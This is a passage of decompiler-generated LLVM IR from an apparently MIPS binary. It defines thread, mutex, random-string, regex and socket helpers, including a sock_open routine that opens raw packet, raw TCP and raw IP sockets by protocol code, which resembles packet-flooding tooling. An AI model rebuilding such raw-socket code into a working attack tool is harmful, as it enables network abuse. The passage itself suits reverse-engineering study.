  %v2_4064e0 = call i32 @mtx_unlock(i32* %v1_4064e0)
  call void @pthread_exit(i32* null)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32* %v1_406458.lcssa, { 1, 0 }
  uselistorder i32* %v1_40645810, { 1, 0, 2 }
  uselistorder i32 %v2_4063c0, { 1, 2, 0 }
  uselistorder i32 %v4_4063cc21, { 0, 2, 1 }
  uselistorder i8* %v3_406348, { 2, 3, 1, 0, 4, 5 }
  uselistorder i8** @global_var_434378.126, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_4064d0, { 1, 0 }
  uselistorder label %dec_label_pc_4064b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_406484, { 1, 0, 2 }
  uselistorder label %dec_label_pc_406464, { 1, 0 }
  uselistorder label %dec_label_pc_40635c, { 1, 0 }
}

define i32 @th_sleep_ms(i32 %arg1) local_unnamed_addr {
entry:
  %v1_406544 = mul i32 %arg1, 1000
  %v2_406558 = call i32 @usleep(i32 %v1_406544)
  ret i32 %v2_406558
}

define i32 @th_sleep_s(i32 %arg1) local_unnamed_addr {
entry:
  %v2_4065ac = call i32 @sleep(i32 %arg1)
  ret i32 %v2_4065ac
}

define i32 @mtx_create() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_4065d0 = ptrtoint i32* %stack_var_-40 to i32
  %v0_4065d4 = load i32, i32* @ra, align 4
  %v0_4065d8 = load i32, i32* @fp, align 4
  store i32 %v2_4065d0, i32* @fp, align 4
  %v3_4065f4 = load i8*, i8** @global_var_41b11c.21, align 4
  %v1_406618 = icmp eq i8* %v3_4065f4, null
  br i1 %v1_406618, label %dec_label_pc_40669c, label %dec_label_pc_40661c

dec_label_pc_40661c:                              ; preds = %entry
  %v4_4065f4 = ptrtoint i8* %v3_4065f4 to i32
  store i32 28, i32* @a2, align 4
  %tmp7 = bitcast i8* %v3_4065f4 to i32*
  %v6_406638 = call i32* @memset(i32* %tmp7, i32 0, i32 28)
  %v1_40664c = add i32 %v4_4065f4, 4
  store i32 %v1_40664c, i32* %tmp7, align 4
  %v3_406680 = inttoptr i32 %v1_40664c to i32*
  %v5_406680 = call i32 @pthread_mutex_init(i32* %v3_406680, i32* null)
  %v1_40668c = icmp eq i32 %v5_406680, 0
  br i1 %v1_40668c, label %dec_label_pc_4066f4, label %dec_label_pc_4066d4

dec_label_pc_40669c:                              ; preds = %entry
  call void @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_40a9e4.143, i32 0, i32 0))
  call void @exit(i32 -1)
  unreachable

dec_label_pc_4066d4:                              ; preds = %dec_label_pc_40661c
  br label %dec_label_pc_4066f4

dec_label_pc_4066f4:                              ; preds = %dec_label_pc_40661c, %dec_label_pc_4066d4
  %stack_var_-16.0 = phi i8* [ null, %dec_label_pc_4066d4 ], [ %v3_4065f4, %dec_label_pc_40661c ]
  %v4_4066f4 = ptrtoint i8* %stack_var_-16.0 to i32
  store i32 %v0_4065d4, i32* @ra, align 4
  store i32 %v0_4065d8, i32* @fp, align 4
  ret i32 %v4_4066f4

; uselistorder directives
  uselistorder i8* %v3_4065f4, { 0, 1, 3, 2 }
  uselistorder i32 28, { 0, 2, 1 }
  uselistorder label %dec_label_pc_4066f4, { 1, 0 }
}

define i32 @mtx_lock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_406738 = load i32, i32* %arg1, align 4
  %v2_406750 = inttoptr i32 %v2_406738 to i32*
  %v3_406750 = call i32 @pthread_mutex_lock(i32* %v2_406750)
  ret i32 %v3_406750
}

define i32 @mtx_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %v2_40679c = load i32, i32* %arg1, align 4
  %v2_4067b4 = inttoptr i32 %v2_40679c to i32*
  %v3_4067b4 = call i32 @pthread_mutex_unlock(i32* %v2_4067b4)
  ret i32 %v3_4067b4
}

define i32 @mtx_destroy(i32* %arg1) local_unnamed_addr {
entry:
  %v2_406800 = load i32, i32* %arg1, align 4
  %v2_406818 = inttoptr i32 %v2_406800 to i32*
  %v3_406818 = call i32 @pthread_mutex_destroy(i32* %v2_406818)
  %v3_406828 = load i32, i32* @global_var_41b1b0.147, align 4
  ret i32 %v3_406828
}

define i32 @function_406858() local_unnamed_addr {
dec_label_pc_406858:
  %stack_var_-32 = alloca i32, align 4
  %v2_406858 = ptrtoint i32* %stack_var_-32 to i32
  %v0_406860 = load i32, i32* @fp, align 4
  store i32 %v2_406858, i32* @fp, align 4
  %v0_406868 = call i32 @mtx_create()
  store i32 %v0_406860, i32* @fp, align 4
  ret i32 %v0_406868

; uselistorder directives
  uselistorder i32 ()* @mtx_create, { 1, 0 }
}

define i32 @splck_lock(i32 %arg1) local_unnamed_addr {
entry:
  %v1_4068a0 = inttoptr i32 %arg1 to i32*
  %v2_4068a0 = call i32 @mtx_lock(i32* %v1_4068a0)
  ret i32 %v2_4068a0
}

define i32 @splck_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v1_4068d8 = inttoptr i32 %arg1 to i32*
  %v2_4068d8 = call i32 @mtx_unlock(i32* %v1_4068d8)
  ret i32 %v2_4068d8
}

define i32 @function_4068f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4068f8:
  %v1_406910 = inttoptr i32 %arg1 to i32*
  %v2_406910 = call i32 @mtx_destroy(i32* %v1_406910)
  ret i32 %v2_406910
}

define i32 @function_406930(i32 %arg1) local_unnamed_addr {
dec_label_pc_406930:
  %v1_40695c = call i32 @rand()
  ret i32 %v1_40695c
}

define i32 @function_406980(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406980:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v5_4069bc = call i32* @memset(i32* %arg1, i32 0, i32 %arg2)
  %v3_4069cc = load i32, i32* @global_var_434370.113, align 4
  %v1_4069d8 = inttoptr i32 %v3_4069cc to i32*
  %v2_4069d8 = call i32 @mtx_lock(i32* %v1_4069d8)
  %v5_4069fc = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_40aa00.157, i32 0, i32 0), i32 0)
  %v1_406a14 = icmp slt i32 %v5_4069fc, 1
  br i1 %v1_406a14, label %dec_label_pc_406ad0, label %dec_label_pc_406a9c.preheader

dec_label_pc_406a9c.preheader:                    ; preds = %dec_label_pc_406980
  %v2_406aa81 = icmp eq i32 %arg2, 0
  br i1 %v2_406aa81, label %dec_label_pc_406ab4, label %dec_label_pc_406a28.preheader

dec_label_pc_406a28.preheader:                    ; preds = %dec_label_pc_406a9c.preheader
  %v5_406a6016 = call i32 @read(i32 %v5_4069fc, i32* %arg1, i32 %arg2)
  %v1_406a7817 = icmp sgt i32 %v5_406a6016, -1
  br i1 %v1_406a7817, label %dec_label_pc_406a88, label %dec_label_pc_406ab4

dec_label_pc_406a88:                              ; preds = %dec_label_pc_406a28.preheader, %dec_label_pc_406a88.dec_label_pc_406a28_crit_edge
  %v5_406a6019 = phi i32 [ %v5_406a60, %dec_label_pc_406a88.dec_label_pc_406a28_crit_edge ], [ %v5_406a6016, %dec_label_pc_406a28.preheader ]
  %storemerge318 = phi i32 [ %v2_406a94, %dec_label_pc_406a88.dec_label_pc_406a28_crit_edge ], [ 0, %dec_label_pc_406a28.preheader ]
  %v2_406a94 = add i32 %v5_406a6019, %storemerge318
  %v2_406aa8 = icmp ult i32 %v2_406a94, %arg2
  br i1 %v2_406aa8, label %dec_label_pc_406a88.dec_label_pc_406a28_crit_edge, label %dec_label_pc_406ab4

dec_label_pc_406a88.dec_label_pc_406a28_crit_edge: ; preds = %dec_label_pc_406a88
  %v3_406a2c.pre = load i32, i32* %stack_var_0, align 4
  %v2_406a34 = add i32 %v2_406a94, %v3_406a2c.pre
  %v2_406a44 = sub i32 %arg2, %v2_406a94
  %v4_406a60 = inttoptr i32 %v2_406a34 to i32*
  %v5_406a60 = call i32 @read(i32 %v5_4069fc, i32* %v4_406a60, i32 %v2_406a44)
  %v1_406a78 = icmp sgt i32 %v5_406a60, -1
  br i1 %v1_406a78, label %dec_label_pc_406a88, label %dec_label_pc_406ab4

dec_label_pc_406ab4:                              ; preds = %dec_label_pc_406a9c.preheader, %dec_label_pc_406a28.preheader, %dec_label_pc_406a88, %dec_label_pc_406a88.dec_label_pc_406a28_crit_edge
  %v2_406ac4 = call i32 @close(i32 %v5_4069fc)
  br label %dec_label_pc_406ad0

dec_label_pc_406ad0:                              ; preds = %dec_label_pc_406980, %dec_label_pc_406ab4
  %v3_406ad4 = load i32, i32* @global_var_434370.113, align 4
  %v1_406ae0 = inttoptr i32 %v3_406ad4 to i32*
  %v2_406ae0 = call i32 @mtx_unlock(i32* %v1_406ae0)
  ret i32 %v2_406ae0

; uselistorder directives
  uselistorder i32 %v5_406a60, { 1, 0 }
  uselistorder i32 %v2_406a94, { 1, 2, 3, 0 }
  uselistorder i32 %v5_4069fc, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32*, i32)* @read, { 1, 0 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_406ad0, { 1, 0 }
  uselistorder label %dec_label_pc_406ab4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_406a88, { 1, 0 }
}

define i32 @function_406b04(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406b04:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_406b04 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_406b04, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v2_406b24 = inttoptr i32 %arg1 to i32*
  %v3_406b24 = call i32 @function_406980(i32* %v2_406b24, i32 %arg2)
  %v1_406bac = add i32 %arg2, -1
  %v2_406bb03 = icmp eq i32 %v1_406bac, 0
  br i1 %v2_406bb03, label %dec_label_pc_406bb8, label %dec_label_pc_406b38

dec_label_pc_406b38:                              ; preds = %dec_label_pc_406b04, %dec_label_pc_406b38
  %v3_406b3c = phi i32 [ %v3_406b3c.pre, %dec_label_pc_406b38 ], [ %arg1, %dec_label_pc_406b04 ]
  %storemerge5 = phi i32 [ %v1_406b98, %dec_label_pc_406b38 ], [ 0, %dec_label_pc_406b04 ]
  %v2_406b44 = add i32 %storemerge5, %v3_406b3c
  %v1_406b58 = inttoptr i32 %v2_406b44 to i8*
  %v2_406b58 = load i8, i8* %v1_406b58, align 1
  %v3_406b58 = sext i8 %v2_406b58 to i32
  %v5_406b60 = srem i32 %v3_406b58, 94
  %fold = mul i32 %v5_406b60, 16777216
  %v1_406b84 = add i32 %fold, 553648128
  %v1_406b888 = udiv i32 %v1_406b84, 16777216
  %v1_406b8c = trunc i32 %v1_406b888 to i8
  store i8 %v1_406b8c, i8* %v1_406b58, align 1
  %v1_406b98 = add nuw i32 %storemerge5, 1
  %v2_406bb0 = icmp ult i32 %v1_406b98, %v1_406bac
  %v3_406b3c.pre = load i32, i32* %stack_var_0, align 4
  br i1 %v2_406bb0, label %dec_label_pc_406b38, label %dec_label_pc_406bb8

dec_label_pc_406bb8:                              ; preds = %dec_label_pc_406b04, %dec_label_pc_406b38
  %v3_406bc8 = phi i32 [ %arg1, %dec_label_pc_406b04 ], [ %v3_406b3c.pre, %dec_label_pc_406b38 ]
  %v2_406bd0 = add i32 %v3_406bc8, %v1_406bac
  %v3_406bd0 = inttoptr i32 %v2_406bd0 to i8*
  store i8 0, i8* %v3_406bd0, align 1
  ret i32 %v2_406bd0

; uselistorder directives
  uselistorder i32 %v1_406b98, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_406bac, { 0, 2, 1 }
  uselistorder i32 16777216, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_406bb8, { 1, 0 }
  uselistorder label %dec_label_pc_406b38, { 1, 0 }
}

define i32 @function_406bf0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bf0:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i1, align 1
  %s2.global-to-local = alloca i32, align 4
  %s4.global-to-local = alloca i32, align 4
  %s5.global-to-local = alloca i32, align 4
  %s6.global-to-local = alloca i32, align 4
  %s7.global-to-local = alloca i32, align 4
  %sp.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i1 false, i1* %s1.global-to-local, align 1
  store i32 0, i32* %sp.global-to-local, align 4
  store i32 0, i32* %s7.global-to-local, align 4
  store i32 0, i32* %s5.global-to-local, align 4
  store i32 0, i32* %s4.global-to-local, align 4
  store i32 0, i32* %s2.global-to-local, align 4
  store i32 0, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s6.global-to-local, align 4
  %tmp = trunc i32 %arg3 to i8
  %tmp4 = inttoptr i32 %arg2 to i8*
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i8*, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_406bfc = load i32, i32* %s7.global-to-local, align 4
  %v0_406c00 = load i32, i32* %s6.global-to-local, align 4
  %v0_406c04 = load i32, i32* %s5.global-to-local, align 4
  %v0_406c08 = load i32, i32* %s4.global-to-local, align 4
  %v0_406c10 = load i32, i32* %s2.global-to-local, align 4
  %v0_406c14.b = load i1, i1* %s1.global-to-local, align 1
  %v0_406c18 = load i32, i32* %s0.global-to-local, align 4
  store i8* %arg1, i8** %stack_var_0, align 4
  %v1_406c50 = icmp eq i8 %tmp, 0
  %. = select i1 %v1_406c50, i32 1, i32 3
  %v2_406c68 = ptrtoint i32* %stack_var_-84 to i32
  %tmp33 = bitcast i32* %stack_var_-84 to %re_pattern_buffer*
  %v3_406c78 = load i32, i32* @global_var_41b228.160, align 4
  store i32 %v3_406c78, i32* %v0.global-to-local, align 4
  %v8_406c84 = call i32 @regcomp(%re_pattern_buffer* %tmp33, i8* %tmp4, i32 %.)
  store i32 %v8_406c84, i32* %v0.global-to-local, align 4
  %v1_406c9c = icmp eq i32 %v8_406c84, 0
  br i1 %v1_406c9c, label %dec_label_pc_406ca0, label %dec_label_pc_406efc

dec_label_pc_406ca0:                              ; preds = %dec_label_pc_406bf0
  %v1_406cb4 = add i32 %tmp12, 1
  store i32 %v1_406cb4, i32* %s2.global-to-local, align 4
  %v1_406cd8 = udiv i32 %v1_406cb4, 67108864
  store i32 %v1_406cd8, i32* %s7.global-to-local, align 4
  %v1_406ce4 = mul i32 %v1_406cb4, 64
  store i32 %v1_406ce4, i32* %s6.global-to-local, align 4
  store i32 %v1_406cb4, i32* %s0.global-to-local, align 4
  store i1 false, i1* %s1.global-to-local, align 1
  store i32 %v1_406cd8, i32* %s5.global-to-local, align 4
  store i32 %v1_406ce4, i32* %s4.global-to-local, align 4
  %v1_406d00 = mul i32 %v1_406cb4, 8
  %v1_406d04 = or i32 %v1_406d00, 3
  %v1_406d08 = add i32 %v1_406d04, 7
  %v1_406d0c = and i32 %v1_406d08, -8
  %v0_406d14 = load i32, i32* %sp.global-to-local, align 4
  %v2_406d14 = sub i32 %v0_406d14, %v1_406d0c
  %v1_406d1c = add i32 %v2_406d14, 27
  %v1_406d20 = and i32 %v1_406d1c, -4
  %v3_406d48 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_406d48, i32* %v0.global-to-local, align 4
  %v4_406d54 = inttoptr i32 %v1_406d20 to i32*
  %v5_406d54 = call i32* @memset(i32* %v4_406d54, i32 0, i32 %v1_406d00)
  store i32 %v1_406d20, i32* %v0.global-to-local, align 4
  %v0_406d68 = load i32, i32* %sp.global-to-local, align 4
  %v1_406d68 = add i32 %v0_406d68, 16
  %v2_406d68 = inttoptr i32 %v1_406d68 to i32*
  store i32 0, i32* %v2_406d68, align 4
  %v3_406d70 = load i8*, i8** %stack_var_0, align 4
  %v0_406d78 = load i32, i32* %v0.global-to-local, align 4
  %v3_406d7c = load i32, i32* @global_var_41b218.161, align 4
  store i32 %v3_406d7c, i32* %v0.global-to-local, align 4
  %v9_406d88 = insertvalue %_TYPEDEF_regmatch_t undef, i32 %v0_406d78, 0
  %v10_406d88 = insertvalue [1 x %_TYPEDEF_regmatch_t] undef, %_TYPEDEF_regmatch_t %v9_406d88, 0
  %v12_406d88 = call i32 @regexec(%re_pattern_buffer* %tmp33, i8* %v3_406d70, i32 %v1_406cb4, [1 x %_TYPEDEF_regmatch_t] %v10_406d88, i32 ptrtoint (i32* @0 to i32))
  store i32 %v12_406d88, i32* %v0.global-to-local, align 4
  %v1_406da0 = icmp eq i32 %v12_406d88, 0
  br i1 %v1_406da0, label %dec_label_pc_406da4, label %dec_label_pc_406ed8

dec_label_pc_406da4:                              ; preds = %dec_label_pc_406ca0
  store i32 %v1_406d20, i32* %v0.global-to-local, align 4
  %v1_406db0 = add i32 %v1_406d20, 8
  %v2_406db0 = inttoptr i32 %v1_406db0 to i32*
  %v3_406db0 = load i32, i32* %v2_406db0, align 4
  store i32 %v1_406d20, i32* %v0.global-to-local, align 4
  %v1_406dc4 = add i32 %v1_406d20, 12
  %v2_406dc4 = inttoptr i32 %v1_406dc4 to i32*
  %v3_406dc4 = load i32, i32* %v2_406dc4, align 4
  %v2_406ddc = sub i32 %v3_406dc4, %v3_406db0
  store i32 %v2_406ddc, i32* %v0.global-to-local, align 4
  %v1_406dec = icmp eq i32 %v2_406ddc, 0
  br i1 %v1_406dec, label %dec_label_pc_406ed8, label %dec_label_pc_406df0

dec_label_pc_406df0:                              ; preds = %dec_label_pc_406da4
  %v3_406e04 = load i8*, i8** @global_var_41b11c.21, align 4
  %v4_406e04 = ptrtoint i8* %v3_406e04 to i32
  store i32 %v4_406e04, i32* %v0.global-to-local, align 4
  %v1_406e28 = icmp eq i8* %v3_406e04, null
  br i1 %v1_406e28, label %dec_label_pc_406ea0, label %dec_label_pc_406e2c

dec_label_pc_406e2c:                              ; preds = %dec_label_pc_406df0
  %v1_406dfc = add i32 %v2_406ddc, 1
  %v3_406e48 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_406e48, i32* %v0.global-to-local, align 4
  %tmp34 = bitcast i8* %v3_406e04 to i32*
  %v6_406e54 = call i32* @memset(i32* %tmp34, i32 0, i32 %v1_406dfc)
  %v3_406e64 = load i8*, i8** %stack_var_0, align 4
  %v4_406e64 = ptrtoint i8* %v3_406e64 to i32
  %v2_406e6c = add i32 %v4_406e64, %v3_406db0
  %v1_406e78 = inttoptr i32 %v2_406e6c to i8*
  %v3_406e80 = load i32, i32* @global_var_41b254.26, align 4
  store i32 %v3_406e80, i32* %v0.global-to-local, align 4
  %v8_406e8c = call i8* @strncpy(i8* nonnull %v3_406e04, i8* %v1_406e78, i32 %v2_406ddc)
  %v10_406e8c = ptrtoint i8* %v8_406e8c to i32
  store i32 %v10_406e8c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_406ed8

dec_label_pc_406ea0:                              ; preds = %dec_label_pc_406df0
  %v3_406ea8 = load i32, i32* @global_var_41b2bc.24, align 4
  store i32 %v3_406ea8, i32* %v0.global-to-local, align 4
  call void @perror(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_40a9e4.143, i32 0, i32 0))
  %v3_406ec4 = load i32, i32* @global_var_41b1f0.25, align 4
  store i32 %v3_406ec4, i32* %v0.global-to-local, align 4
  call void @exit(i32 -1)
  unreachable

dec_label_pc_406ed8:                              ; preds = %dec_label_pc_406ca0, %dec_label_pc_406da4, %dec_label_pc_406e2c
  %stack_var_-120.0 = phi i8* [ null, %dec_label_pc_406da4 ], [ %v3_406e04, %dec_label_pc_406e2c ], [ null, %dec_label_pc_406ca0 ]
  store i32 %v2_406c68, i32* %v0.global-to-local, align 4
  %v3_406ee0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32532) to i32*), align 4
  store i32 %v3_406ee0, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_406ee0)
  br label %dec_label_pc_406efc

dec_label_pc_406efc:                              ; preds = %dec_label_pc_406bf0, %dec_label_pc_406ed8
  %stack_var_-120.1 = phi i8* [ %stack_var_-120.0, %dec_label_pc_406ed8 ], [ null, %dec_label_pc_406bf0 ]
  %v4_406efc = ptrtoint i8* %stack_var_-120.1 to i32
  store i32 %v4_406efc, i32* %v0.global-to-local, align 4
  store i32 %v0_406bfc, i32* %s7.global-to-local, align 4
  store i32 %v0_406c00, i32* %s6.global-to-local, align 4
  store i32 %v0_406c04, i32* %s5.global-to-local, align 4
  store i32 %v0_406c08, i32* %s4.global-to-local, align 4
  store i32 %v0_406c10, i32* %s2.global-to-local, align 4
  store i1 %v0_406c14.b, i1* %s1.global-to-local, align 1
  store i32 %v0_406c18, i32* %s0.global-to-local, align 4
  ret i32 %v4_406efc

; uselistorder directives
  uselistorder i32 %v1_406d20, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_406d00, { 1, 0 }
  uselistorder i32 %v1_406ce4, { 1, 0 }
  uselistorder i32 %v1_406cd8, { 1, 0 }
  uselistorder i32 %v1_406cb4, { 4, 0, 3, 1, 2, 5 }
  uselistorder %re_pattern_buffer* %tmp33, { 1, 0 }
  uselistorder i8** %stack_var_0, { 2, 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %s7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %s6.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %s5.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %s4.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %s2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i1* %s1.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %s0.global-to-local, { 2, 3, 0, 1 }
  uselistorder void (i8*)* @perror, { 3, 2, 1, 0 }
  uselistorder i8** @global_var_41b11c.21, { 3, 2, 1, 0 }
  uselistorder i32 12, { 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 2, 1, 17, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 1, 2, 0 }
  uselistorder i32 7, { 1, 0 }
  uselistorder label %dec_label_pc_406efc, { 1, 0 }
  uselistorder label %dec_label_pc_406ed8, { 2, 1, 0 }
}

define i32 @sock_open(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_0 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_406f38 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_406f38, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  store i32 %arg1, i32* %v0.global-to-local, align 4
  %v2_406f70 = icmp eq i32 %arg1, 134
  br i1 %v2_406f70, label %dec_label_pc_4070e8, label %dec_label_pc_406f74

dec_label_pc_406f74:                              ; preds = %entry
  %v1_406f78 = icmp ult i32 %arg1, 135
  %v1_406f7c = icmp eq i1 %v1_406f78, false
  br i1 %v1_406f7c, label %dec_label_pc_406fa4, label %dec_label_pc_406f80

dec_label_pc_406f80:                              ; preds = %dec_label_pc_406f74
  %v2_406f88 = icmp eq i32 %arg1, 3
  br i1 %v2_406f88, label %dec_label_pc_406fd0, label %dec_label_pc_406f8c

dec_label_pc_406f8c:                              ; preds = %dec_label_pc_406f80
  %v2_406f94 = icmp eq i32 %arg1, 17
  br i1 %v2_406f94, label %dec_label_pc_407148, label %dec_label_pc_407178

dec_label_pc_406fa4:                              ; preds = %dec_label_pc_406f74
  %v2_406fa8 = icmp eq i32 %arg1, 177
  br i1 %v2_406fa8, label %dec_label_pc_407088, label %dec_label_pc_406fac

dec_label_pc_406fac:                              ; preds = %dec_label_pc_406fa4
  %v2_406fb4 = icmp eq i32 %arg1, 255
  br i1 %v2_406fb4, label %dec_label_pc_407118, label %dec_label_pc_406fb8

dec_label_pc_406fb8:                              ; preds = %dec_label_pc_406fac
  %v2_406fc0 = icmp eq i32 %arg1, 176
  br i1 %v2_406fc0, label %dec_label_pc_407028, label %dec_label_pc_407178

dec_label_pc_406fd0:                              ; preds = %dec_label_pc_406f80
  %v3_407004 = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_407004, i32* %v0.global-to-local, align 4
  %v4_407010 = call i32 @socket(i32 17, i32 3, i32 768)
  store i32 %v4_407010, i32* %v0.global-to-local, align 4
  store i32 %v4_407010, i32* %stack_var_-32, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_407028:                              ; preds = %dec_label_pc_406fb8
  %v3_40705c = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_40705c, i32* %v0.global-to-local, align 4
  %v4_407068 = call i32 @socket(i32 17, i32 3, i32 768)
  store i32 %v4_407068, i32* %stack_var_-32, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_407088:                              ; preds = %dec_label_pc_406fa4
  %v3_4070bc = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_4070bc, i32* %v0.global-to-local, align 4
  %v4_4070c8 = call i32 @socket(i32 17, i32 3, i32 8)
  store i32 %v4_4070c8, i32* %stack_var_-32, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_4070e8:                              ; preds = %entry
  %v3_4070f4 = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_4070f4, i32* %v0.global-to-local, align 4
  %v4_407100 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_407100, i32* %v0.global-to-local, align 4
  store i32 %v4_407100, i32* %stack_var_-32, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_407118:                              ; preds = %dec_label_pc_406fac
  %v3_407124 = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_407124, i32* %v0.global-to-local, align 4
  %v4_407130 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v4_407130, i32* %v0.global-to-local, align 4
  store i32 %v4_407130, i32* %stack_var_-32, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_407148:                              ; preds = %dec_label_pc_406f8c
  %v3_407154 = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_407154, i32* %v0.global-to-local, align 4
  %v4_407160 = call i32 @socket(i32 2, i32 1, i32 17)
  store i32 %v4_407160, i32* %v0.global-to-local, align 4
  store i32 %v4_407160, i32* %stack_var_-32, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_407178:                              ; preds = %dec_label_pc_406fb8, %dec_label_pc_406f8c
  %v3_407184 = load i32, i32* @global_var_41b2a0.162, align 4
  store i32 %v3_407184, i32* %v0.global-to-local, align 4
  %v4_407190 = call i32 @socket(i32 2, i32 2, i32 6)
  store i32 %v4_407190, i32* %v0.global-to-local, align 4
  store i32 %v4_407190, i32* %stack_var_-32, align 4
  br label %dec_label_pc_4071a4

dec_label_pc_4071a4:                              ; preds = %dec_label_pc_407148, %dec_label_pc_407118, %dec_label_pc_4070e8, %dec_label_pc_407088, %dec_label_pc_407028, %dec_label_pc_406fd0, %dec_label_pc_407178
  %v3_407220 = phi i32 [ %v4_407160, %dec_label_pc_407148 ], [ %v4_407130, %dec_label_pc_407118 ], [ %v4_407100, %dec_label_pc_4070e8 ], [ %v4_4070c8, %dec_label_pc_407088 ], [ %v4_407068, %dec_label_pc_407028 ], [ %v4_407010, %dec_label_pc_406fd0 ], [ %v4_407190, %dec_label_pc_407178 ]
  %stack_var_-48.0 = phi i8 [ 0, %dec_label_pc_407148 ], [ 0, %dec_label_pc_407118 ], [ 0, %dec_label_pc_4070e8 ], [ 1, %dec_label_pc_407088 ], [ 1, %dec_label_pc_407028 ], [ 0, %dec_label_pc_406fd0 ], [ 0, %dec_label_pc_407178 ]
  store i32 %v3_407220, i32* %v0.global-to-local, align 4
  %v1_4071ac = icmp sgt i32 %v3_407220, -1
  br i1 %v1_4071ac, label %dec_label_pc_4071fc, label %dec_label_pc_4071b0

dec_label_pc_4071b0:                              ; preds = %dec_label_pc_4071a4
  store i32 %tmp, i32* %v0.global-to-local, align 4
  %v1_4071bc = icmp eq i32* %arg2, null
  br i1 %v1_4071bc, label %dec_label_pc_407354, label %dec_label_pc_4071c0

dec_label_pc_4071c0:                              ; preds = %dec_label_pc_4071b0
  %v3_4071c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32508) to i32*), align 4
  store i32 %v3_4071c4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4071c4)
  %v0_4071dc = load i32, i32* %v0.global-to-local, align 4
  %v1_4071dc = inttoptr i32 %v0_4071dc to i32*
  %v2_4071dc = load i32, i32* %v1_4071dc, align 4
  store i32 %tmp, i32* %v0.global-to-local, align 4
  store i32 %v2_4071dc, i32* %arg2, align 4
  br label %dec_label_pc_407354

dec_label_pc_4071fc:                              ; preds = %dec_label_pc_4071a4
  %v3_4071fc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_4071fc, i32* %v0.global-to-local, align 4
  %v2_407204 = icmp eq i32 %v3_4071fc, 134
  br i1 %v2_407204, label %dec_label_pc_407220, label %dec_label_pc_407208

dec_label_pc_407208:                              ; preds = %dec_label_pc_4071fc
  %v2_407210 = icmp eq i32 %v3_4071fc, 255
